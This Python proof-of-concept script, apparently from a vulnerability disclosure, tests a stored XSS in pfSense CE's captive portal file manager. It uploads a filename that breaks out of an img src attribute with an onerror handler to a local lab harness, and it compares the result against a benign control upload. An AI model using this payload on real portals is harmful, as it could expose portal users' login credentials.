#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: pfsense-cp-filename-xss (Medium: 6.1)
#  Vendor: pfSense CE (Netgate)
#  Versions: pfSense CE 2.9.0-DEVELOPMENT
#  Impact: Filename interpolates into <img src> / CSS url(
#  Requires: `plant with page-services-captiveportal-filemanager; victim is an unauth portal client`. CSRF-magic on POST unless noted. WebGUI PHP-FPM is root.
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "pfsense-cp-filename-xss"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove pfSense CP file-manager filename interpolates raw into default portal HTML."""


import html
import json
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

LABEL = "PFSENSE-CP-FILENAME-XSS"
WITNESS = "PFSENSE-CP-FILENAME-XSS-WITNESS"
HOST = "127.0.0.1"
PORT = 19110
PIN_SHA = "9363ac5b8651a1c7a333180425ce7719070f95f9"
PIN_VERSION = "2.9.0-DEVELOPMENT"
CONTROL_FILENAME = "logo.png"
CONTROL_STORED = "captiveportal-logo.png"
TRIGGER_FILENAME = 'captiveportal-logo.png" onerror="PFSENSE-CP-FILENAME-XSS-WITNESS'
RAW_BREAKOUT = '" onerror="PFSENSE-CP-FILENAME-XSS-WITNESS'
IMG_CONTROL = '<img src="captiveportal-logo.png"/>'
LOGO_ASSIGN = "$logo_src = $element['name'];"
BG_URL = '"url(" . $element[\'name\'] . ")"'
IMG_INTERP = '<img src="{$logo_src}"/>'
BG_INTERP = "background:{$bg_src}"
NAME_ASSIGN = '$name = $_FILES[\'new\'][\'name\'];'
NAME_PREFIX = '$name = "captiveportal-" . $_FILES[\'new\'][\'name\'];'
GUI_LIST_ENCODE = "htmlspecialchars($element['name'])"
ENCODED_LOGO_CALL = "htmlspecialchars($logo_src)"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def http(
    path: str,
    data: dict[str, str] | None = None,
    timeout_s: float = 8.0,
) -> tuple[int, bytes]:
    url = f"http://{HOST}:{PORT}{path}"
    body = None
    headers: dict[str, str] = {}
    method = "GET"
    if data is not None:
        body = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        method = "POST"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout_s) as resp:
            return int(resp.status), resp.read()
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, str(exc).encode()


def load_json(path: str, data: dict[str, str] | None = None) -> dict[str, Any]:
    status, blob = http(path, data=data)
    text = blob.decode("utf-8", "replace")
    if status != 200:
        raise RuntimeError(f"{path} status={status} body={text[:200]}")
    payload = json.loads(text)
    if not isinstance(payload, dict):
        raise RuntimeError(f"{path} not-object")
    return payload


def clip(value: Any, limit: int = 240) -> str:
    text = value if isinstance(value, str) else json.dumps(value, separators=(",", ":"))
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def assert_source(src: str) -> str | None:
    if LOGO_ASSIGN not in src:
        return "logo-assign-missing"
    if BG_URL not in src:
        return "bg-url-concat-missing"
    if IMG_INTERP not in src:
        return "img-src-interp-missing"
    if BG_INTERP not in src:
        return "bg-css-interp-missing"
    if NAME_ASSIGN not in src:
        return "filemanager-name-assign-missing"
    if NAME_PREFIX not in src:
        return "filemanager-prefix-missing"
    if GUI_LIST_ENCODE not in src:
        return "gui-list-encode-missing"
    if ENCODED_LOGO_CALL in src:
        return "logo-src-htmlspecialchars"
    return None


def main() -> int:
    log(f"label={LABEL} url=http://{HOST}:{PORT} pin={PIN_VERSION} sha={PIN_SHA}")
    log(f"control={CONTROL_FILENAME!r} trigger={TRIGGER_FILENAME!r}")
    log("# Recon: unauth portal origin XSS (lab-proven = raw payload + WITNESS in default login HTML).")
    log("# Integrity: intercept auth_user/auth_pass on that page (inferred, not executed).")
    log("# Availability: none shown.")
    log("# Closed: GUI cookies (portal origin != GUI); filemanager list htmlspecialchars; SA-26_05 widget is a different sink.")
    log("IOC closed gui-cookie-theft=no sa-26_05=different-sink")

    try:
        ping = load_json("/ping")
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"ping {exc}")
    if ping.get("pong") != "pong":
        return fail("ping-no-pong")
    if ping.get("sha") != PIN_SHA:
        return fail(f"ping-sha={ping.get('sha')}")
    if ping.get("version") != PIN_VERSION:
        return fail(f"ping-version={ping.get('version')}")
    if ping.get("privilege") != "page-services-captiveportal-filemanager":
        return fail(f"privilege={ping.get('privilege')}")
    if ping.get("gui_cookie_theft") is not False:
        return fail("ping-claimed-gui-cookies")
    log(f"ioc ping privilege={ping.get('privilege')} victim={ping.get('victim')}")

    status, src_blob = http("/source")
    src = src_blob.decode("utf-8", "replace")
    log(f"ioc source-status={status} bytes={len(src)}")
    if status != 200:
        return fail("source-http")
    source_reason = assert_source(src)
    if source_reason:
        return fail(source_reason)
    log("ioc pin-source-match=yes")

    try:
        control = load_json("/control", {"filename": CONTROL_FILENAME})
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"control {exc}")
    control_html = str(control.get("html") or "")
    control_stored = str(control.get("stored") or "")
    control_logo = str(control.get("logo_src") or "")
    log(f"ioc control-stored={clip(control_stored)}")
    log(f"ioc control-logo={clip(control_logo)}")
    log(f"ioc control-gui-list={clip(control.get('gui_list'))}")
    log(f"ioc control-witness={int(bool(control.get('witness_present')))}")
    log(f"ioc control-img-raw={int(bool(control.get('img_tag_raw')))}")
    control_inert = (
        control_stored == CONTROL_STORED
        and control_logo == CONTROL_STORED
        and IMG_CONTROL in control_html
        and RAW_BREAKOUT not in control_html
        and WITNESS not in control_html
        and not bool(control.get("raw_breakout"))
        and not bool(control.get("witness_present"))
        and bool(control.get("img_tag_raw"))
        and bool(control.get("auth_user_field"))
        and bool(control.get("auth_pass_field"))
    )
    if not control_inert:
        return fail("control-inert=no")
    log("ioc control-inert=yes")

    encoded_trigger = html.escape(TRIGGER_FILENAME, quote=True)
    try:
        trigger = load_json("/trigger", {"filename": TRIGGER_FILENAME})
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"trigger {exc}")
    trigger_html = str(trigger.get("html") or "")
    trigger_stored = str(trigger.get("stored") or "")
    trigger_logo = str(trigger.get("logo_src") or "")
    trigger_gui = str(trigger.get("gui_list") or "")
    log(f"ioc trigger-stored={clip(trigger_stored)}")
    log(f"ioc trigger-logo={clip(trigger_logo)}")
    log(f"ioc trigger-gui-list={clip(trigger_gui)}")
    log(f"ioc trigger-witness={int(bool(trigger.get('witness_present')))}")
    log(f"ioc trigger-raw-breakout={int(bool(trigger.get('raw_breakout')))}")
    img_raw_payload = f'<img src="{TRIGGER_FILENAME}"/>'
    trigger_raw = (
        trigger_stored == TRIGGER_FILENAME
        and trigger_logo == TRIGGER_FILENAME
        and img_raw_payload in trigger_html
        and RAW_BREAKOUT in trigger_html
        and WITNESS in trigger_html
        and bool(trigger.get("raw_breakout"))
        and bool(trigger.get("witness_present"))
        and encoded_trigger not in trigger_html
        and "&quot; onerror=" not in trigger_html
        and trigger.get("gui_cookie_theft") is False
        and bool(trigger.get("file_exists"))
        and bool(trigger.get("wrote_portal"))
        and bool(trigger.get("auth_user_field"))
        and bool(trigger.get("auth_pass_field"))
    )
    gui_encoded = (
        "&lt;script&gt;" in trigger_gui or "&quot;" in trigger_gui or "&gt;" in trigger_gui
    )
    if not gui_encoded:
        return fail("gui-list-not-encoded")
    log("ioc gui-list-encoded=yes")
    if not trigger_raw:
        return fail("trigger-raw=no")
    log("ioc trigger-raw=yes")

    try:
        oracle = load_json("/oracle")
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"oracle {exc}")
    oracle_html = str(oracle.get("html") or "")
    if RAW_BREAKOUT not in oracle_html or WITNESS not in oracle_html:
        return fail("oracle-witness-missing")
    if not bool(oracle.get("raw_breakout")) or not bool(oracle.get("witness_present")):
        return fail("oracle-flags")
    if oracle.get("gui_cookie_theft") is not False:
        return fail("oracle-claimed-gui-cookies")
    log("ioc oracle-raw=yes")

    log(
        "SUCCESS PFSENSE-CP-FILENAME-XSS "
        "control-inert=yes trigger-raw=yes witness-unescaped=yes "
        "gui-cookie-theft=no PFSENSE-CP-FILENAME-XSS-WITNESS"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

